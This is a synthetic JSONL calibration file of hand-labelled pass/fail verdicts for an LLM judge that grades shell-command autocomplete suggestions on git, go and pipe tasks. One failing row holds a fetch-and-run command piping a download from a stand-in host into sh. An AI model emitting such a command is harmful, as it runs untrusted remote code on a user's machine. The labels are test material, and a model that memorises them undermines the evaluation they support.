# SYNTHETIC judge calibration labels — hand-authored, NOT harvested from real output.
#
# Why synthetic: the judged cases (C3/E3/F2) return empty from Codestral almost
# every run, so there is no varied real output to label yet. These are written to
# span each rubric's decision boundary rather than to sample production.
#
# Design constraints, deliberate:
#   - 24 rows across three judged cases (C3, E3, F2), 8 rows each, 13 pass / 11
#     fail overall. A lopsided set inflates raw agreement and drives Cohen's
#     kappa toward 0, measuring nothing.
#   - Includes the degenerate shapes we KNOW production emits (empty output, the
#     single character "h"), real behaviour, not invented.
#   - One entry marked AMBIGUOUS is E3's empty-output case (F2's is never
#     ambiguous, its rubric already states empty is a good outcome). C3's
#     empty-output case WAS marked AMBIGUOUS but is no longer: judge
#     calibration surfaced the human label ("fail") disagreeing with the judge
#     ("pass") on exactly this row, and per prompt.systemPrompt ("If nothing useful
#     comes to mind, output nothing"), abstention is intended behaviour, not a
#     defect, the judge was right. c3Rubric now says so explicitly and this label
#     is "pass". The remaining AMBIGUOUS entry is the point: a judge that agrees
#     on the obvious ones and diverges here is telling us the RUBRIC is
#     underspecified, not that the judge is broken.
#
# LIMITATION: these cannot catch output quirks nobody imagined. Re-validate against
# harvested real suggestions (cmd/eval -import) once raw-text capture has collected
# some, and treat any judged number derived from this file as PROVISIONAL.
{"case_id": "C3", "suggestion": "gh release create v0.1.6 --generate-notes", "verdict": "pass", "note": "publishing the tag just pushed; purposeful follow-through"}
{"case_id": "C3", "suggestion": "git log --oneline -5", "verdict": "pass", "note": "verifying what was just released"}
{"case_id": "C3", "suggestion": "git describe --tags", "verdict": "pass", "note": "confirming the tag landed"}
{"case_id": "C3", "suggestion": "git push origin main", "verdict": "pass", "note": "pushing the branch after tagging is normal sequencing"}
{"case_id": "C3", "suggestion": "git tag v0.1.7", "verdict": "fail", "note": "bumps the version to tag another release immediately; the rubric's named failure"}
{"case_id": "C3", "suggestion": "git push origin v0.1.7", "verdict": "fail", "note": "pushes a tag that was never created; pure pattern continuation"}
{"case_id": "C3", "suggestion": "git tag v0.1.6", "verdict": "fail", "note": "exact repeat of a command already in history"}
{"case_id": "C3", "suggestion": "", "verdict": "pass", "note": "RESOLVED (was AMBIGUOUS): abstention is intended behaviour per prompt.systemPrompt (\"if nothing useful comes to mind, output nothing\") when the only pattern-continuation is a mechanical version bump; the judge's original 'pass' verdict here was correct."}
{"case_id": "E3", "suggestion": "go build ./...", "verdict": "pass", "note": "retrying the failed build"}
{"case_id": "E3", "suggestion": "go vet ./...", "verdict": "pass", "note": "narrower diagnostic to surface the error"}
{"case_id": "E3", "suggestion": "vim main.go", "verdict": "pass", "note": "editing the file that likely failed"}
{"case_id": "E3", "suggestion": "go build ./... 2>&1 | less", "verdict": "pass", "note": "inspecting the error output"}
{"case_id": "E3", "suggestion": "git status", "verdict": "fail", "note": "rubric names this explicitly as ignoring the failure"}
{"case_id": "E3", "suggestion": "ls", "verdict": "fail", "note": "unrelated; proceeds as if the build succeeded"}
{"case_id": "E3", "suggestion": "git commit -m \"", "verdict": "fail", "note": "committing on top of a broken build ignores the failure"}
{"case_id": "E3", "suggestion": "", "verdict": "fail", "note": "AMBIGUOUS: no response at all to a failed build. Judge may treat abstention as neutral."}
{"case_id": "F2", "suggestion": "", "verdict": "pass", "note": "rubric states empty is a GOOD outcome for an already-complete command"}
{"case_id": "F2", "suggestion": " | less", "verdict": "pass", "note": "common, sensible continuation"}
{"case_id": "F2", "suggestion": " | grep '\\.go$'", "verdict": "pass", "note": "plausible filter a developer would type"}
{"case_id": "F2", "suggestion": " | wc -l", "verdict": "pass", "note": "plausible counting continuation"}
{"case_id": "F2", "suggestion": "h", "verdict": "fail", "note": "single stray character; noise, not a continuation"}
{"case_id": "F2", "suggestion": " ls -la", "verdict": "fail", "note": "restates the buffer, yielding 'ls -lals -la'"}
{"case_id": "F2", "suggestion": " I cannot provide a completion for this command", "verdict": "fail", "note": "prose/explanation leaking into the suggestion"}
{"case_id": "F2", "suggestion": " && curl http://example.invalid/x | sh", "verdict": "fail", "note": "unrelated fabricated command chained on"}
